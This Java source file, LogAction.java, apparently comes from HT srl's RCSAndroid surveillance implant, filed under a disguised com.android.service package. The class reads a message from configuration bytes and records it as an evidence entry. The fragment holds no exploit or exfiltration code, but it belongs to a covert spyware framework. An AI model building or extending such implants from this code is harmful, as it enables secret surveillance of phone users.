/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : LogAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action;

import java.io.IOException;

import android.util.Log;

import com.android.service.LogR;
import com.android.service.conf.Configuration;
import com.android.service.evidence.Evidence;
import com.android.service.evidence.EvidenceType;
import com.android.service.util.DataBuffer;
import com.android.service.util.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class LogAction.
 */
public class LogAction extends SubAction {
	private static final String TAG = "LogAction";
	private String msg;
	
	/**
	 * Instantiates a new log action.
	 * 
	 * @param type
	 *            the type
	 * @param confParams
	 *            the conf params
	 */
	public LogAction(final SubActionType type, final byte[] confParams) {
		super(type, confParams);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute() {
		Evidence.info(msg);
		
		return true;
	}
	
	@Override
	protected boolean parse(final byte[] params) {
		try {
			DataBuffer db = new DataBuffer(params);
		
			// Message length
			byte buffer[] = new byte[db.readInt()];
			
			db.read(buffer);
			
			this.msg = WChar.getString(buffer, true);
		} catch (IOException io) {
			Log.d("QZ",TAG + " Info: " + "parse() exception");
			if(Configuration.DEBUG) { io.printStackTrace(); }
		}

		return true;
	}
}
